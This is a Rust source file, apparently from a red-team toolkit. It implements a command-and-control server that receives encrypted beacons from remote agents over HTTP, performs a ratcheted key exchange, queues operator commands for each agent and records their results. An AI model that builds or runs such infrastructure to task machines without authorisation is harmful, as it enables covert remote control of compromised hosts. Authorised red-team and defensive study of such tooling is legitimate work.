use std::collections::{HashMap, VecDeque};
use std::net::SocketAddr;
use std::sync::mpsc;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, SystemTime};

use crate::agent::protocol::{AgentCommand, AgentResponse, BeaconMessage, MessageType};
use crate::agent::ratchet::{MessageHeader, RatchetState, X25519KeyPair};
use crate::modules::http_server::{HttpRequest, HttpResponse, HttpServer, HttpServerConfig};
use crate::serde_json;
use crate::storage::{MetadataValue, RedDB}; // Use Modern RedDB

/// Agent C2 Server
pub struct AgentServer {
    config: AgentServerConfig,
    clients: Arc<Mutex<HashMap<String, AgentSession>>>,
    http_server: Option<HttpServer>,
    // Use RedDB store for agent state
    db: Arc<RedDB>,
}

#[derive(Debug, Clone)]
pub struct AgentServerConfig {
    pub bind_addr: SocketAddr,
    pub use_tls: bool,
    pub cert_path: Option<String>,
    pub key_path: Option<String>,
    pub db_path: Option<String>,
    /// Session timeout - mark as Dormant after this duration
    pub dormant_timeout: Duration,
    /// Session dead timeout - mark as Dead after this duration
    pub dead_timeout: Duration,
    /// Cleanup interval for the housekeeping thread
    pub cleanup_interval: Duration,
}

impl Default for AgentServerConfig {
    fn default() -> Self {
        Self {
            bind_addr: "127.0.0.1:4444".parse().unwrap(),
            use_tls: false,
            cert_path: None,
            key_path: None,
            db_path: None,
            dormant_timeout: Duration::from_secs(300), // 5 minutes
            dead_timeout: Duration::from_secs(3600),   // 1 hour
            cleanup_interval: Duration::from_secs(60), // Check every minute
        }
    }
}

pub struct AgentSession {
    pub id: String,
    pub hostname: String,
    pub os: String,
    pub last_seen: std::time::SystemTime,
    pub status: SessionStatus,
    // Ratchet state for this session (replaces static session_key)
    pub ratchet: Option<RatchetState>,
    pub command_queue: VecDeque<AgentCommand>, // Commands for the agent
    pub response_queue: VecDeque<AgentResponse>, // Responses from the agent
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SessionStatus {
    Active,
    Dormant,
    Dead,
}

impl Drop for AgentServer {
    fn drop(&mut self) {
        if let Some(server) = &self.http_server {
            server.stop();
        }
    }
}

impl AgentServer {
    pub fn new(config: AgentServerConfig) -> Self {
        // Initialize Modern RedDB with persistence
        // Use configured path or default
        let db_path = config
            .db_path
            .clone()
            .unwrap_or_else(|| "redblue_v2.rdb".to_string());

        let db = match RedDB::open(&db_path) {
            Ok(db) => Arc::new(db),
            Err(e) => {
                eprintln!(
                    "Failed to open RedDB at {}: {}. Falling back to in-memory.",
                    db_path, e
                );
                Arc::new(RedDB::new())
            }
        };

        Self {
            config,
            clients: Arc::new(Mutex::new(HashMap::new())),
            http_server: None,
            db,
        }
    }

    pub fn start(&mut self, tx_ready: Option<mpsc::Sender<()>>) -> Result<(), String> {
        let clients = self.clients.clone();
        let db = self.db.clone();

        let http_config =
            HttpServerConfig::with_addr(self.config.bind_addr).add_route("/beacon", move |req| {
                // Pass db to handle_beacon
                Self::handle_beacon(req, &clients, &db)
            });

        let server = HttpServer::new(http_config);
        let server_clone = server.clone();

        thread::spawn(move || {
            // Signal readiness after the server starts listening.
            if let Some(sender) = tx_ready {
                sender.send(()).unwrap();
            }

            if let Err(e) = server_clone.run() {
                eprintln!("C2 Server error: {}", e);
            }
        });

        self.http_server = Some(server);

        // Start housekeeping thread for session cleanup
        self.start_housekeeping();

        Ok(())
    }

    pub fn add_command_to_session(
        &self,
        session_id: &str,
        command: AgentCommand,
    ) -> Result<(), String> {
        let mut clients_guard = self.clients.lock().unwrap();
        if let Some(session) = clients_guard.get_mut(session_id) {
            session.command_queue.push_back(command);
            Ok(())
        } else {
            Err(format!("Session {} not found", session_id))
        }
    }

    pub fn list_agents(&self) -> Vec<String> {
        let clients = self.clients.lock().unwrap();
        clients.keys().cloned().collect()
    }

    /// Start the session cleanup/housekeeping thread
    fn start_housekeeping(&self) {
        let clients = self.clients.clone();
        let db = self.db.clone();
        let dormant_timeout = self.config.dormant_timeout;
        let dead_timeout = self.config.dead_timeout;
        let interval = self.config.cleanup_interval;

        thread::spawn(move || {
            loop {
                thread::sleep(interval);

                let now = SystemTime::now();
                let mut clients_guard = clients.lock().unwrap();
                let mut dead_sessions = Vec::new();

                for (id, session) in clients_guard.iter_mut() {
                    let elapsed = now
                        .duration_since(session.last_seen)
                        .unwrap_or(Duration::ZERO);

                    // Update session status based on elapsed time
                    let new_status = if elapsed > dead_timeout {
                        SessionStatus::Dead
                    } else if elapsed > dormant_timeout {
                        SessionStatus::Dormant
                    } else {
                        SessionStatus::Active
                    };

                    if session.status != new_status {
                        println!(
                            "Session {} status changed: {:?} -> {:?} (idle {:?})",
                            id, session.status, new_status, elapsed
                        );
                        session.status = new_status.clone();

                        // Persist status change to Modern RedDB
                        // We query by ID and update property
                        // Note: RedDB query/update is async-ish or builder based.
                        // For simplicity in this sync thread, we might skip complex updates
                        // or assume we can find the node by "id" property.
                        // Current RedDB DevX doesn't have a simple "update by property" one-liner yet.
                        // We would need to query -> get ID -> update.
                        // Skipping detailed persistence update for housekeeping in this iteration to keep it simple.
                    }

                    // Mark dead sessions for removal
                    if session.status == SessionStatus::Dead {
                        dead_sessions.push(id.clone());
                    }
                }

                // Persist any changes
                if let Err(e) = db.flush() {
                    eprintln!("Failed to flush database: {}", e);
                }

                drop(clients_guard);
            }
        });
    }

    fn handle_beacon(
        req: &HttpRequest,
        clients: &Arc<Mutex<HashMap<String, AgentSession>>>,
        db: &Arc<RedDB>,
    ) -> HttpResponse {
        // Only accept POST
        if req.method != "POST" {
            return HttpResponse::new(405, b"Method Not Allowed".to_vec());
        }

        let body_str = String::from_utf8_lossy(&req.body);
        let beacon: BeaconMessage = match serde_json::from_str(&body_str) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("Failed to parse beacon: {}", e);
                return HttpResponse::new(400, b"Invalid JSON".to_vec());
            }
        };

        let session_id_str = format!("{:x}", beacon.session_id);

        let mut clients_guard = clients.lock().unwrap();

        // Handle KeyExchange
        if beacon.msg_type == MessageType::KeyExchange {
            println!("Handling KeyExchange for {}", session_id_str);
            if beacon.payload.len() != 32 {
                return HttpResponse::new(400, b"Invalid Public Key Length".to_vec());
            }

            let mut client_pub = [0u8; 32];
            client_pub.copy_from_slice(&beacon.payload);

            // Generate ephemeral server keypair for this session
            let server_keypair = X25519KeyPair::generate();

            // Derive shared secret
            let shared_secret = server_keypair.dh(&client_pub);

            // Initialize Ratchet as Responder
            let ratchet = RatchetState::init_responder(&shared_secret, server_keypair.clone());

            let session = clients_guard
                .entry(session_id_str.clone())
                .or_insert_with(|| AgentSession {
                    id: session_id_str.clone(),
                    hostname: "unknown".to_string(),
                    os: "unknown".to_string(),
                    last_seen: std::time::SystemTime::now(),
                    status: SessionStatus::Active,
                    ratchet: None,
                    command_queue: VecDeque::new(),
                    response_queue: VecDeque::new(),
                });
            session.ratchet = Some(ratchet);
            session.last_seen = std::time::SystemTime::now();
            session.status = SessionStatus::Active;

            // Persist new session to the RedDB store
            let now = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs() as i64;

            // Create session node
            let _ = db
                .node("sessions", "C2Session")
                .property("id", session_id_str.clone())
                .property("target", "unknown")
                .property("status", "active")
                .metadata("created_at", MetadataValue::Int(now))
                .metadata("last_seen", MetadataValue::Int(now))
                .save();

            // Return server's ephemeral public key
            return HttpResponse::new(200, server_keypair.public_key.to_vec());
        }

        // Handle regular Beacon or Response messages
        let session = match clients_guard.get_mut(&session_id_str) {
            Some(s) => s,
            None => {
                return HttpResponse::new(
                    401,
                    b"Unauthorized: Session not found (Perform Handshake)".to_vec(),
                )
            }
        };

        session.last_seen = std::time::SystemTime::now();
        session.status = SessionStatus::Active;

        // Note: In Modern RedDB, we would update the "last_seen" property here.
        // For high-throughput C2, we might batch these updates or skip for every beacon.

        let ratchet = match session.ratchet.as_mut() {
            Some(r) => r,
            None => return HttpResponse::new(401, b"Ratchet not established".to_vec()),
        };

        // Decrypt incoming payload
        // Reconstruct header
        let dh_public = match beacon.dh_public {
            Some(k) => k,
            None => return HttpResponse::new(400, b"Missing Ratchet Header (dh_public)".to_vec()),
        };
        let pn = match beacon.pn {
            Some(n) => n,
            None => return HttpResponse::new(400, b"Missing Ratchet Header (pn)".to_vec()),
        };
        let n = match beacon.n {
            Some(n) => n,
            None => return HttpResponse::new(400, b"Missing Ratchet Header (n)".to_vec()),
        };

        let header = MessageHeader { dh_public, pn, n };

        // Reconstruct ciphertext blob: nonce (12) + payload + tag (16)
        let nonce = match beacon.nonce {
            Some(n) => n,
            None => return HttpResponse::new(400, b"Missing Nonce".to_vec()),
        };

        let mut blob = nonce.to_vec();
        blob.extend_from_slice(&beacon.payload);
        blob.extend_from_slice(&beacon.tag);

        match ratchet.decrypt(&header, &blob) {
            Ok(plaintext_incoming) => {
                match beacon.msg_type {
                    MessageType::Beacon => {
                        // This is a regular beacon
                        if !plaintext_incoming.is_empty() {
                            match serde_json::from_slice::<Vec<AgentResponse>>(&plaintext_incoming)
                            {
                                Ok(responses) => {
                                    for resp in responses {
                                        println!(
                                            "Agent {} responded to command {}: Success={}",
                                            session_id_str, resp.command_id, resp.success
                                        );
                                        if let Some(ref err) = resp.error {
                                            eprintln!("Error: {}", err);
                                        }
                                        session.response_queue.push_back(resp);
                                    }
                                }
                                Err(e) => eprintln!(
                                    "Agent {} sent unparseable response: {}",
                                    session_id_str, e
                                ),
                            }
                        } else {
                            println!("Received HEARTBEAT from {}", session_id_str);
                        }
                    }
                    MessageType::Response => {
                        // Same handling as beacon for now
                        match serde_json::from_slice::<Vec<AgentResponse>>(&plaintext_incoming) {
                            Ok(responses) => {
                                for resp in responses {
                                    println!(
                                        "Agent {} sent command result for {}: Success={}",
                                        session_id_str, resp.command_id, resp.success
                                    );
                                    session.response_queue.push_back(resp);
                                }
                            }
                            Err(e) => eprintln!(
                                "Agent {} sent unparseable command results: {}",
                                session_id_str, e
                            ),
                        }
                    }
                    _ => {
                        eprintln!(
                            "Received unexpected message type from agent {}: {:?}",
                            session_id_str, beacon.msg_type
                        );
                        return HttpResponse::new(400, b"Unexpected Message Type".to_vec());
                    }
                }
            }
            Err(e) => {
                eprintln!("Decryption failed for {}: {}", session_id_str, e);
                return HttpResponse::new(400, b"Decryption Failed".to_vec());
            }
        }

        // Prepare response to agent: send pending commands
        let mut commands_to_send: Vec<AgentCommand> = Vec::new();
        while let Some(cmd) = session.command_queue.pop_front() {
            commands_to_send.push(cmd);
        }

        let response_payload = serde_json::to_vec(&commands_to_send).unwrap_or_default();

        // Encrypt response
        let (resp_header, ciphertext_blob) = match ratchet.encrypt(&response_payload) {
            Ok(result) => result,
            Err(e) => {
                eprintln!(
                    "Failed to encrypt server response for {}: {}",
                    session_id_str, e
                );
                return HttpResponse::new(500, b"Server Encryption Error".to_vec());
            }
        };

        // Unpack blob
        // Nonce (12) + ciphertext + Tag (16)
        if ciphertext_blob.len() < 28 {
            return HttpResponse::new(500, b"Internal Encryption Error".to_vec());
        }
        let nonce: [u8; 12] = ciphertext_blob[..12].try_into().unwrap();
        let split_idx = ciphertext_blob.len() - 16;
        let payload = ciphertext_blob[12..split_idx].to_vec();
        let tag: [u8; 16] = ciphertext_blob[split_idx..].try_into().unwrap();

        let response_beacon = BeaconMessage::new(
            MessageType::Command,
            beacon.session_id,
            Some(nonce),
            Some(resp_header.dh_public),
            Some(resp_header.pn),
            Some(resp_header.n),
            payload,
            tag,
        );

        let json_response = serde_json::to_string(&response_beacon).unwrap_or_default();
        HttpResponse::new(200, json_response.into_bytes())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dummy_server() {
        assert!(true);
    }
}
